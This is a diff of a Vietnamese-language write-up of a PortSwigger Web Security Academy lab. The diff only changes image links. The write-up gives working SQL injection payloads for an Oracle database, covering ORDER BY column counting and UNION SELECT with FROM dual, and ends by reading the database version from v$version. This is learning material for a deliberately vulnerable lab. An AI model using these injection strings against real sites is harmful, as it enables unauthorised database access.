@@ -1,4 +1,4 @@
-![[Pasted image 20260604100442.png]]
+![Giao diện lab ban đầu](images/Pasted%20image%2020260604100442.png)
 # Tổng quan về lab
 -Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
 ```LINK
@@ -19,21 +19,21 @@ https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?categor
 https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+2--
 ```
 Khi đến `ORDER BY 3---` thì server bị lỗi 
-![[Pasted image 20260604110517.png]]
+![ORDER BY 3 bị lỗi](images/Pasted%20image%2020260604110517.png)
 => câu truy vấn trước có 2 cột
 Tiếp theo ta xác định kiểu dữ liệu của từng cột,ta bắt đầu với thử 2 cột là text:
-![[Pasted image 20260604110641.png]]
+![UNION SELECT text không có FROM dual bị lỗi](images/Pasted%20image%2020260604110641.png)
 Nhưng nó lại bị lỗi Internal Server Error??
 Lý do:Oracle yêu cầu nếu muốn tạo chuỗi để test ta phải dùng bảng `dual` là bảng giả
 Vậy ta phải thêm `FROM dual`:
 ```SQL
 ' UNION SELECT 'abc','xyz' FROM dual--
 ```
-![[Pasted image 20260604111025.png]]
+![UNION SELECT text với FROM dual thành công](images/Pasted%20image%2020260604111025.png)
 => cả 2 cột của câu truy vấn trước là text nên ta có thể để version ở cột nào cũng được :v
 Ta tiến hành sử dụng `UNION SELECT`:
 ```SQL
 ' UNION SELECT NULL,banner FROM v$version--
 ```
-![[Pasted image 20260604111523.png]]
+![Hiển thị Oracle version từ v$version](images/Pasted%20image%2020260604111523.png)
 =>solved!
